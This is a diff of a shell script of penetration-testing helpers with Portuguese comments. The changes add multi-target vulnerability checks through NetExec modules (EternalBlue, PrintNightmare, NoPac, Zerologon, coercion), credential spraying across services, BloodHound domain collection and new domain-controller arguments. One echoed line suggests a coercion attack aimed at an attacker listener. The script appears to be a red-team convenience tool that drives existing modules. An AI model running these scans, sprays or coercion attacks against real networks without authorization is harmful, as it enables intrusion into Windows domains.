@@ -234,45 +234,104 @@ webscan() {
 #------------------------------------------------------------------------------------
 #Usage: checkvulns -t target -u user [-p password] [-H hash] [-k]
 checkvulns() {
-                                                               
     if [[ $# -eq 0 ]]; then
-        echo "\033[1;31m[!] Missing parameters. \033[0m"
-        echo "Usage: $0 -t target -u user [-p password] [-H hash] [-k]"
+        echo -e "\033[1;31m[!] Missing parameters. \033[0m"
+        echo "Usage: $0 -t target|-t targets.txt -u user [-p password] [-H hash] [-k]"
         return 1
-    fi     
-    
-    get_auth $@
+    fi
+
+    # Parse -t argument to check if it's a file
+    local target_file=""
+    local target_arg=""
+    local pass_args=()
+    local single_mode=0
+
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            -t|--target)
+                if [[ -f "$2" && "$2" == *.txt ]]; then
+                    target_file="$2"
+                else
+                    target_arg="$2"
+                fi
+                pass_args+=("$1" "$2")
+                shift
+                ;;
+            --single)
+                single_mode=1
+                ;;
+            *)
+                pass_args+=("$1")
+                ;;
+        esac
+        shift
+    done
+
+    # Se for arquivo de targets, faz loop
+    if [[ -n "$target_file" && $single_mode -eq 0 ]]; then
+        while IFS= read -r tgt || [[ -n "$tgt" ]]; do
+            [[ -z "$tgt" ]] && continue
+            # Monta os argumentos para o alvo individual
+            new_args=()
+            for arg in "${pass_args[@]}"; do
+                if [[ "$arg" == "$target_file" ]]; then
+                    new_args+=("$tgt")
+                else
+                    new_args+=("$arg")
+                fi
+            done
+            # Chama recursivamente, mas agora em modo single
+            checkvulns -t "$tgt" "${new_args[@]/--single}" --single
+        done < "$target_file"
+        echo -e "\033[1;31m[*] Done. \033[0m"
+        return
+    fi
+
+    # Execução normal para um alvo só
+    get_auth "${pass_args[@]}"
     if [[ $? -eq 2 ]]; then
         echo "Usage: $0 -t target -u user [-p password] [-H hash] [-k]"
         return 1
-    fi   
-    #debug
-    #echo "nxc = $nxc_auth"
-    #echo "imp = $imp_auth"
-    #end debug    
-       
-    echo "\033[1;35m[!] Checking for vulnerabilities \033[0m"
-    echo '\033[0;34m[*] EternalBlue (MS17-010) \033[0m'
-    nxc smb "${nxc_auth[@]}" -M ms17-010 #| grep MS17-010 | tr -s " " | cut -d " " -f 3-
-    echo '\033[0;34m[*] PrintNightmare (CVE-2021-34527) \033[0m'
-    nxc smb "${nxc_auth[@]}" -M printnightmare | grep -i PRINT | tr -s " " | cut -d " " -f 5-
-    #echo '\033[0;34m[*] SMBGhost \033[0m'
-    #nxc smb "${nxc_auth[@]}" -M smbghost | grep SMBGHOST | tr -s " " | cut -d " " -f 5-
-    echo '\033[0;34m[*] NoPac (CVE-2021-42278) \033[0m'
-    nxc smb "${nxc_auth[@]}" -M nopac | grep NOPAC | tr -s " " | cut -d " " -f 5- | tr -s '\n'
-    echo '\033[0;34m[*] Coerce Attacks (CVE-2021-36942 / etc) \033[0m'
-    nxc smb "${nxc_auth[@]}" -M coerce_plus | grep COERCE | tr -s " " | cut -d " " -f 5- | tee coerce.tmp
+    fi
+
+    echo -e "\033[1;35m[!] Checking for vulnerabilities on $target_arg \033[0m"
+
+    # Teste rápido de conexão SMB
+    smb_test_output=$(nxc smb "${nxc_auth[@]}")
+    smb_success=$(echo "$smb_test_output" | grep -a "SMB" | grep  -a -F '[+]')
+
+    if [[ -z "$smb_success" ]]; then
+        echo -e "\033[0;33m[*] SMB connection failed or invalid credentials. Skipping. \033[0m"
+        if [[ $single_mode -eq 0 ]]; then
+            echo -e "\033[1;31m[*] Done. \033[0m"
+        fi
+        return
+    fi
+
+    echo -e '\033[0;34m[*] EternalBlue (MS17-010) \033[0m'
+    nxc smb "${nxc_auth[@]}" -M ms17-010 | grep -a MS17-010 | tr -s " " | cut -d " " -f 3-
+
+    echo -e '\033[0;34m[*] PrintNightmare (CVE-2021-34527) \033[0m'
+    nxc smb "${nxc_auth[@]}" -M printnightmare | grep -a PRINTNIGHTMARE | tr -s " " | cut -d " " -f 5- | grep -v "STATUS_ACCESS_DENIED"
+
+    echo -e '\033[0;34m[*] NoPac (CVE-2021-42278) \033[0m'
+    nxc smb "${nxc_auth[@]}" -M nopac | grep -a NOPAC | tr -s " " | cut -d " " -f 5- | tr -s '\n'
+
+    echo -e '\033[0;34m[*] Coerce Attacks (CVE-2021-36942 / etc) \033[0m'
+    nxc smb "${nxc_auth[@]}" -M coerce_plus | grep -a COERCE | tr -s " " | cut -d " " -f 5- | tee coerce.tmp
     if grep -q "VULNERABLE" coerce.tmp; then
-      echo "Try: nxc smb "${nxc_auth[@]}" -M coerce_plus -o LISTENER=$kali"
+      echo "Try: nxc smb ${nxc_auth[*]} -M coerce_plus -o LISTENER=\$kali"
     fi
     rm coerce.tmp 2>/dev/null
-    echo '\033[0;34m[*] Zerologon (CVE-2020-1472) \033[0m'
-    nxc smb "${nxc_auth[@]}" -M zerologon | grep ZEROLOGON | tr -s " " | cut -d " " -f 5- | sed 's/[-]//g'
-    
-    trap - INT
-    echo "\033[1;31m[*] Done. \033[0m"
-}
 
+    echo -e '\033[0;34m[*] Zerologon (CVE-2020-1472) \033[0m'
+    nxc smb "${nxc_auth[@]}" -M zerologon | grep -a ZEROLOGON | tr -s " " | cut -d " " -f 5- | sed 's/[-]//g' | grep -v "DCERPCException"
+
+    trap - INT
+    if [[ $single_mode -eq 0 ]]; then
+        echo -e "\033[1;31m[*] Done. \033[0m"
+    fi
+}
 
 
 # ADSCAN
@@ -404,8 +463,11 @@ testcreds() {
         exit 1
     fi
 
+    # Cria arquivo temporário único
+    auth_tmp=$(mktemp /tmp/auth.XXXXXX)
+
     # Set a trap to clean up temporary files on exit
-    trap "echo ''" INT
+    trap "rm -f '$auth_tmp'; echo ''" INT
 
     if [[ $3 == "-f" ]]; then
         file=$4
@@ -416,13 +478,13 @@ testcreds() {
             user=$(echo "$line" | cut -d: -f1)
             pass=$(echo "$line" | cut -d: -f2)
             if [[ $pass =~ ^[a-fA-F0-9]{32}$ ]]; then
-                echo "-t $2 -u $user -H $pass" >> auth.tmp
+                echo "-t $2 -u $user -H $pass" >> "$auth_tmp"
             else
-                echo "-t $2 -u $user -p $pass" >> auth.tmp
+                echo "-t $2 -u $user -p $pass" >> "$auth_tmp"
             fi
         done < "$file"
     else
-        echo "$@" > auth.tmp
+        echo "$@" > "$auth_tmp"
     fi
 
     while IFS= read -r line || [ -n "$line" ]; do
@@ -458,9 +520,9 @@ testcreds() {
         echo -e '\033[0;34m[*] Trying FTP... \033[0m'
         nxc ftp "${nxc_auth[@]}" 2>/dev/null | grep --text --color=never + | highlight red "(Pwn3d!)" | tr -s " "
         
-    done < auth.tmp
+    done < "$auth_tmp"
 
-    rm auth.tmp 2>/dev/null
+    rm -f "$auth_tmp" 2>/dev/null
     trap - INT
     echo -e "\033[1;31m[*] Done. \033[0m"
 }
@@ -596,17 +658,24 @@ enumdomain() {
         
     echo -e "\n\033[1;37m[\033[1;35m+\033[1;37m] Starting data collection... \033[0m"
 
-    echo "\033[1;36m[?] Ingest data for Bloodhound? [y/N] \033[0m"
-    read -s -q -t 60 confirm
-    if [[ $confirm =~ ^[Yy]$ ]]; then    
-      echo "\033[1;35m[!] Ingesting AD data \033[0m"
-      # echo "\033[0;34m[*] Collection set to 'All'. Grab yourself a cup of coffee, this might take a wee while. \033[0m"
-      echo "\033[0;34m[>] bloodhound-python $(echo "$blood_auth") -ns $dc_ip -d $domain -c all --zip \033[0m"
-      bloodhound-python $(echo "$blood_auth") -ns $dc_ip -d $domain -c all --zip | grep -oE [0-9]*_bloodhound\.zip > path.tmp
-      mv $(cat path.tmp) ./${domain}_bloodhound.zip
-      echo "\033[0;34m[*] Saving data to ./${domain}_bloodhound.zip"
-      rm path.tmp
+echo -e "\033[1;36m[?] Ingest data for Bloodhound? [y/N] \033[0m"
+read -s -q -t 60 confirm
+if [[ $confirm =~ ^[Yy]$ ]]; then    
+    echo -e "\033[1;35m[!] Ingesting AD data \033[0m"
+    echo -e "\033[0;34m[>] nxc ldap ${nxc_auth[*]} --bloodhound --collection All --dns-server $dc_ip \033[0m"
+
+    # Executa o comando, suprime o output, mas captura o nome do arquivo zip
+    zip_path=$(nxc ldap "${nxc_auth[@]}" --bloodhound --collection All --dns-server "$dc_ip" 2>/dev/null \
+        | grep -oE '/[^ ]+_bloodhound\.zip' | tail -1)
+
+    if [[ -n "$zip_path" && -f "$zip_path" ]]; then
+        dest_zip="./${domain}_bloodhound.zip"
+        mv "$zip_path" "$dest_zip"
+        echo -e "\033[0;34m[*] Saving data to $dest_zip\033[0m"
+    else
+        echo -e "\033[1;31m[!] Could not find BloodHound zip output!\033[0m"
     fi
+fi
 
     trap - INT
     echo "\n\033[1;31m[*] Done. \033[0m"
@@ -947,8 +1016,8 @@ function color() {
 get_auth() {
     # Initialize variables
     local kerb=0
-    local target hashes auth user password
-    #local dc_ip domain dc_fqdn
+    local target user password hashes auth
+    local domain dc_ip dc_fqdn
 
     # Parse arguments
     while [ $# -gt 0 ]; do
@@ -979,6 +1048,18 @@ get_auth() {
                 kerb=1
                 shift
                 ;;
+            --domain|-d)
+                domain="$2"
+                shift
+                ;;
+            --dc-ip)
+                dc_ip="$2"
+                shift
+                ;;
+            --dc-fqdn)
+                dc_fqdn="$2"
+                shift
+                ;;
             *)
                 echo -e "\033[1;31m[!] Wrong parameters. \033[0m"
                 return 2
@@ -991,17 +1072,38 @@ get_auth() {
     if [[ "$user" == "''" ]]; then user=""; fi
     if [[ "$password" == "''" ]]; then password=""; fi
 
-
     # Validate mandatory parameters
     if [[ -z "$target" ]]; then
         echo -e "\033[1;31m[!] Target is required. Use --target or -t. \033[0m"
         return 2
     fi
 
-    # Extract data from /etc/hosts
-    domain=$(grep -i -m 1 'dc' /etc/hosts | awk '{print $5}')
-    dc_ip=$(grep -i -m 1 'dc' /etc/hosts | awk '{print $1}')
-    dc_fqdn=$(grep -i "$target" /etc/hosts | awk '{print $4}')
+    # Se não passou domínio, tenta pegar do /etc/hosts
+    if [[ -z "$domain" ]]; then
+        domain=$(awk 'tolower($0) ~ /dc/ {print $5; exit}' /etc/hosts)
+        if [[ -z "$domain" ]]; then
+            echo -e "\033[1;31m[!] Domain not found. Use --domain or -d. \033[0m"
+            return 2
+        fi
+    fi
+
+    # Se não passou dc_ip, tenta pegar do /etc/hosts usando o domínio (case insensitive)
+    if [[ -z "$dc_ip" ]]; then
+        dc_ip=$(awk -v dom="$domain" 'tolower($0) ~ tolower(dom) && tolower($0) ~ /dc/ {print $1; exit}' /etc/hosts)
+        if [[ -z "$dc_ip" ]]; then
+            echo -e "\033[1;31m[!] DC IP not found for domain $domain. Use --dc-ip. \033[0m"
+            return 2
+        fi
+    fi
+
+    # Se não passou dc_fqdn, tenta pegar do /etc/hosts usando o domínio (case insensitive)
+    if [[ -z "$dc_fqdn" ]]; then
+        dc_fqdn=$(awk -v dom="$domain" 'tolower($0) ~ tolower(dom) && tolower($0) ~ /dc/ {print $4; exit}' /etc/hosts)
+        if [[ -z "$dc_fqdn" ]]; then
+            echo -e "\033[1;31m[!] DC FQDN not found for domain $domain. Use --dc-fqdn. \033[0m"
+            return 2
+        fi
+    fi
 
     # Sync date (optional, ensure `ntpdate` exists)
     if command -v ntpdate > /dev/null 2>&1; then
@@ -1035,17 +1137,5 @@ get_auth() {
         nxc_auth+=(-k)
         imp_auth+=(-k -dc-host "$dc_fqdn")
     fi
-
-    # Extract bloodhound-compatible authentication
-    blood_auth=$(printf "%s " "${nxc_auth[@]}" | grep -oE "\-u.*")
-
-    # Export variables for further use
-    export user
-    export nxc_auth
-    export imp_auth
-    export blood_auth
-    export dc_ip
-    export domain
-    export dc_fqdn
 }
 
